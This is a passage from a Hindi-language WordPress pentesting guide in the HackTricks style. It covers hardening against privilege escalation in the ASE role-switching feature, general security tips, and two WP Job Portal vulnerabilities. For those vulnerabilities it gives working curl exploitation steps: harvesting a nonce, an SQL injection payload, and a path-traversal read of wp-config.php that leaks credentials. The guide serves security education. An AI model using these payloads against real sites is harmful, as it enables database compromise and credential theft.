- उन भूमिका-स्विचिंग सुविधाओं की तलाश करें जो उपयोगकर्ता मेटा में “मूल भूमिकाओं” को बनाए रखती हैं (जैसे, `_asenha_view_admin_as_original_roles`)।
- रीसेट/पुनर्स्थापना पथों की पहचान करें जो:
- `$_REQUEST` / `$_GET` / `$_POST` से उपयोगकर्ता नाम पढ़ते हैं।
- `add_role()` / `remove_role()` के माध्यम से भूमिकाओं को संशोधित करते हैं बिना `current_user_can()` और `wp_verify_nonce()` / `check_admin_referer()` के।
- एक प्लगइन विकल्प सरणी (जैसे, `viewing_admin_as_role_are`) के आधार पर अधिकृत करते हैं, न कि अभिनेता की क्षमताओं के आधार पर।

सुरक्षा बढ़ाना

- हर स्थिति-परिवर्तन शाखा पर क्षमता जांच को लागू करें (जैसे, `current_user_can('manage_options')` या अधिक सख्त)।
- सभी भूमिका/अनुमति परिवर्तनों के लिए नॉनस की आवश्यकता करें और उन्हें सत्यापित करें: `check_admin_referer()` / `wp_verify_nonce()`।
- कभी भी अनुरोध-प्रदत्त उपयोगकर्ता नामों पर भरोसा न करें; प्रमाणित अभिनेता और स्पष्ट नीति के आधार पर लक्षित उपयोगकर्ता को सर्वर-साइड पर हल करें।
- प्रोफ़ाइल/भूमिका अपडेट पर “मूल भूमिकाओं” की स्थिति को अमान्य करें ताकि पुरानी उच्च-विशेषाधिकार बहाली से बचा जा सके:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- न्यूनतम स्थिति को स्टोर करने पर विचार करें और अस्थायी भूमिका स्विच के लिए समय-सीमित, क्षमता-रक्षित टोकन का उपयोग करें।

---

## WordPress सुरक्षा

### नियमित अपडेट

सुनिश्चित करें कि WordPress, प्लगइन्स और थीम अपडेट हैं। यह भी पुष्टि करें कि wp-config.php में स्वचालित अपडेट सक्षम है:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **केवल विश्वसनीय WordPress प्लगइन्स और थीम्स स्थापित करें**।

### सुरक्षा प्लगइन्स

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **अन्य सिफारिशें**

- डिफ़ॉल्ट **admin** उपयोगकर्ता को हटाएं
- **मजबूत पासवर्ड** और **2FA** का उपयोग करें
- समय-समय पर **उपयोगकर्ताओं** की **अनुमतियों** की **समीक्षा** करें
- Brute Force हमलों को रोकने के लिए **लॉगिन प्रयासों** की संख्या सीमित करें
- **`wp-admin.php`** फ़ाइल का नाम बदलें और केवल आंतरिक रूप से या कुछ IP पते से पहुंच की अनुमति दें।

### अपर्याप्त सत्यापन के माध्यम से अनधिकृत SQL इंजेक्शन (WP Job Portal <= 2.3.2)

WP Job Portal भर्ती प्लगइन ने एक **savecategory** कार्य को उजागर किया जो अंततः `modules/category/model.php::validateFormData()` के अंदर निम्नलिखित कमजोर कोड को निष्पादित करता है:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
इस स्निपेट द्वारा पेश की गई समस्याएँ:

1. **असंसाधित उपयोगकर्ता इनपुट** – `parentid` सीधे HTTP अनुरोध से आता है।
2. **WHERE क्लॉज के अंदर स्ट्रिंग संयोजन** – कोई `is_numeric()` / `esc_sql()` / तैयार बयान नहीं है।
3. **अप्रमाणित पहुंच** – हालांकि क्रिया `admin-post.php` के माध्यम से निष्पादित होती है, लेकिन केवल एक जांच मौजूद है, जो एक **CSRF नॉन्स** (`wp_verify_nonce()`) है, जिसे कोई भी आगंतुक सार्वजनिक पृष्ठ से प्राप्त कर सकता है, जिसमें शॉर्टकोड `[wpjobportal_my_resumes]` शामिल है।

#### शोषण

1. एक ताजा नॉन्स प्राप्त करें:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` का दुरुपयोग करके मनमाना SQL इंजेक्ट करें:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
प्रतिक्रिया इंजेक्ट किए गए प्रश्न के परिणाम को प्रकट करती है या डेटाबेस को बदलती है, जो SQLi को साबित करती है।

### अप्रमाणित मनमाना फ़ाइल डाउनलोड / पथ ट्रैवर्सल (WP Job Portal <= 2.3.2)

एक और कार्य, **downloadcustomfile**, आगंतुकों को पथ ट्रैवर्सल के माध्यम से **डिस्क पर कोई भी फ़ाइल डाउनलोड** करने की अनुमति देता था। कमजोर स्थान `modules/customfield/model.php::downloadCustomUploadedFile()` में स्थित है:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` हमलावर द्वारा नियंत्रित है और **साफ किए बिना** जोड़ा गया है। फिर से, एकमात्र गेट एक **CSRF nonce** है जिसे रिज़्यूमे पृष्ठ से प्राप्त किया जा सकता है।

#### शोषण
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
सर्वर `wp-config.php` की सामग्री के साथ प्रतिक्रिया करता है, DB क्रेडेंशियल्स और ऑथ कीज़ लीक करता है।

## संदर्भ

- [Litho Theme में अनधिकृत मनमाना फ़ाइल हटाने की भेद्यता](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [WP Job Portal Plugin में कई महत्वपूर्ण भेद्यताएँ पैच की गईं](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [ASE Plugin में विशेषाधिकार वृद्धि का दुर्लभ मामला जो 100k+ साइटों को प्रभावित करता है](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 परिवर्तन सेट – प्रोफ़ाइल अपडेट पर मूल भूमिकाएँ हटाएँ](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)

{{#include ../../banners/hacktricks-training.md}}
